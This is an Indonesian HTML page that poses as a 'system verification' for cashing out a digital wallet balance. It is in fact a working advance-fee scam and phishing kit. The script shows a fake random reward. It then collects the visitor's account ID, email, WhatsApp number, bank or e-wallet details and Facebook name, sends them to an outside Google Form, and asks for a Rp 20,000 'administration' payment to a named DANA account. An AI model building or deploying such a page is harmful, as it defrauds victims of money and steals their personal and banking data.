<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sistem Aktivasi Layanan Digital</title>
    <style>
        :root {
            --primary: #10b981;
            --dark-bg: #0f172a;
            --card-bg: #1e293b;
            --input-bg: #020617;
            --dana-blue: #0085ff;
        }
        body {
            font-family: 'Inter', sans-serif; text-align: center; 
            background-color: var(--dark-bg); color: white; margin: 0; padding: 20px;
            user-select: none;
        }
        .container { max-width: 420px; margin: auto; background: var(--card-bg); padding: 30px; border-radius: 28px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid #334155; position: relative; }
        
        /* Luckybox / Animation Section */
        .wallet-wrapper { position: relative; width: 140px; height: 140px; margin: 20px auto; z-index: 10; }
        #main-icon { width: 100%; height: 100%; cursor: pointer; transition: 0.4s; position: relative; z-index: 11; }
        .pulse { animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }

        #sync-value {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
            font-size: 26px; font-weight: 800; color: var(--primary); background: white; 
            padding: 12px 20px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); z-index: 15; transition: 0.6s;
        }
        #sync-value.show { transform: translate(-50%, -50%) scale(1); }

        /* Form UI */
        .form-section { display: none; text-align: left; background: #2d3748; padding: 20px; border-radius: 20px; margin-top: 20px; }
        .form-group { margin-bottom: 12px; }
        label { font-size: 10px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 700; text-transform: uppercase; }
        input, select {
            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #475569; box-sizing: border-box; background: var(--input-bg); color: white; font-size: 14px; outline: none;
        }

        .btn-main { 
            padding: 18px; font-size: 16px; font-weight: 800; cursor: pointer;
            background: var(--primary); color: white; border: none; border-radius: 15px; width: 100%; margin-top: 10px; position: relative; z-index: 12;
        }

        /* Result Modal */
        .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(2, 6, 23, 0.98); backdrop-filter: blur(12px); }
        .modal-content { background: white; color: #1e293b; margin: 10% auto; padding: 25px; border-radius: 30px; width: 88%; max-width: 360px; text-align: center; }
        
        .dana-card { background: linear-gradient(135deg, #0085ff 0%, #005bc4 100%); color: white; border-radius: 20px; padding: 22px; margin: 18px 0; text-align: left; }
        .copy-box { display: flex; align-items: center; justify-content: space-between; background: rgba(255,255,255,0.2); padding: 12px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.3); margin-top: 5px; }
        .btn-copy { background: white; color: var(--dana-blue); border: none; padding: 8px 15px; border-radius: 8px; font-size: 11px; font-weight: 900; cursor: pointer; }
        
        .btn-finish { display: block; padding: 16px; background: #22c55e; color: white; border-radius: 15px; text-decoration: none; font-weight: 800; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="container">
        <h2 style="color: var(--primary); margin: 0;">VERIFIKASI SISTEM</h2>
        <p id="top-msg" style="font-size: 13px; color: #94a3b8;">Ketuk ikon untuk memulai sinkronisasi data</p>
        
        <div class="wallet-wrapper" id="boxArea">
            <img id="main-icon" class="pulse" src="https://cdn-icons-png.flaticon.com/512/10142/10142646.png" alt="Wallet" onclick="handleStart()">
            <div id="sync-value"></div>
        </div>

        <button id="startBtn" class="btn-main" onclick="handleStart()">MULAI SEKARANG</button>

        <div id="formSection" class="form-section">
            <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
            
            <div class="form-group">
                <label>ID Pengguna:</label>
                <input type="text" id="regId" placeholder="ID Akun">
            </div>
            <div class="form-group">
                <label>Email Terdaftar:</label>
                <input type="email" id="regEmail" placeholder="nama@email.com">
            </div>
            <div class="form-group">
                <label>WhatsApp:</label>
                <input type="tel" id="regWa" value="+62" oninput="validWa(this)" onkeydown="lockPrefix(event, this)">
            </div>
            <div class="form-group">
                <label>Metode Pencairan Ke:</label>
                <select id="regBank">
                    <option value="">-- Pilih --</option>
                    <option value="BCA">BCA</option>
                    <option value="DANA">DANA</option>
                    <option value="OVO">OVO</option>
                </select>
            </div>
            <div class="form-group">
                <label>Nama Sesuai Rekening:</label>
                <input type="text" id="regNamaRek" placeholder="Nama Lengkap">
            </div>
            <div class="form-group">
                <label>Nomor Rekening / HP:</label>
                <input type="number" id="regNoRek" placeholder="0000xxxx">
            </div>
            <div class="form-group">
                <label>Nama Facebook:</label>
                <input type="text" id="regNamaFB" placeholder="Nama Profil FB">
            </div>
            
            <button class="btn-main" onclick="handleSubmit()">KONFIRMASI DATA</button>
        </div>
    </div>

    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h3 style="margin: 0; color: #0f172a;">AKTIVASI AKHIR</h3>
            <p style="font-size: 12px; color:#64748b; margin: 15px 0;">Nilai integrasi sebesar <b id="valShow" style="color:var(--primary);"></b> siap diaktifkan. Selesaikan administrasi <b>Rp 20.000</b> ke:</p>
            <div class="dana-card">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png" style="width:70px; filter: brightness(0) invert(1); margin-bottom: 15px;" alt="DANA">
                <div style="font-size: 10px; opacity: 0.8; font-weight: bold;">NAMA PEMILIK:</div>
                <div style="font-size: 16px; font-weight: 800; margin-bottom: 12px;">NIZAR ARDIANSYAH</div>
                <div class="copy-box">
                    <span id="targetNum" style="font-size: 20px; font-weight: 800;">085129867807</span>
                    <button class="btn-copy" onclick="copyAction()">SALIN</button>
                </div>
            </div>
            <a href="https://www.facebook.com/vipprimestore/" class="btn-finish">KONFIRMASI PEMBAYARAN</a>
        </div>
    </div>

    <script>
        const SCORES = ["Rp 100.000", "Rp 150.000", "Rp 200.000"];

        function lockPrefix(e, el) {
            if ((e.keyCode == 8 || e.keyCode == 46) && el.selectionStart <= 3) e.preventDefault();
        }

        function validWa(el) {
            if (!el.value.startsWith("+62")) el.value = "+62";
            let num = el.value.substring(3).replace(/\D/g, '');
            if (num.startsWith("0")) num = num.substring(1);
            el.value = "+62" + num;
        }

        function handleStart() {
            // Animasi ikon saat diklik
            const icon = document.getElementById('main-icon');
            const btn = document.getElementById('startBtn');
            const disp = document.getElementById('sync-value');
            
            icon.classList.remove('pulse');
            icon.style.transform = "scale(0.8)";
            btn.innerText = "SINKRONISASI...";
            btn.disabled = true;

            setTimeout(() => {
                icon.style.opacity = "0";
                const res = SCORES[Math.floor(Math.random() * SCORES.length)];
                disp.innerText = res;
                disp.classList.add('show');
                localStorage.setItem("cache_v", res);
                
                setTimeout(() => {
                    document.getElementById('boxArea').style.display = "none";
                    btn.style.display = "none";
                    document.getElementById('formSection').style.display = "block";
                    document.getElementById('top-msg').innerText = "Status: Sinkronisasi " + res + " Berhasil";
                }, 1500);
            }, 800);
        }

        function handleSubmit() {
            // Validasi sederhana
            const fields = ['regId', 'regEmail', 'regWa', 'regBank', 'regNamaRek', 'regNoRek', 'regNamaFB'];
            for(let f of fields) {
                if(!document.getElementById(f).value || document.getElementById(f).value === "+62") {
                    alert("Harap lengkapi semua data!"); return;
                }
            }
            
            // Proses kirim ke Google Form (Ganti dengan URL/Entry Anda)
            const d = new FormData();
            d.append('entry.498136123', document.getElementById('regId').value);
            d.append('entry.2145381120', document.getElementById('regEmail').value);
            d.append('entry.954302406', document.getElementById('regWa').value);
            d.append('entry.1747382514', document.getElementById('regBank').value);
            d.append('entry.371995109', document.getElementById('regNamaRek').value);
            d.append('entry.1836945173', document.getElementById('regNoRek').value);
            d.append('entry.1660055715', document.getElementById('regNamaFB').value);

            fetch("https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse", {
                method: "POST", mode: "no-cors", body: d
            }).then(() => {
                document.getElementById('valShow').innerText = localStorage.getItem("cache_v");
                document.getElementById('resultModal').style.display = "block";
            });
        }

        function copyAction() {
            const num = document.getElementById("targetNum").innerText;
            const t = document.createElement("textarea");
            t.value = num; document.body.appendChild(t); t.select();
            document.execCommand("copy"); document.body.removeChild(t);
            alert("Nomor Rekening Disalin");
        }
    </script>
</body>
</html>
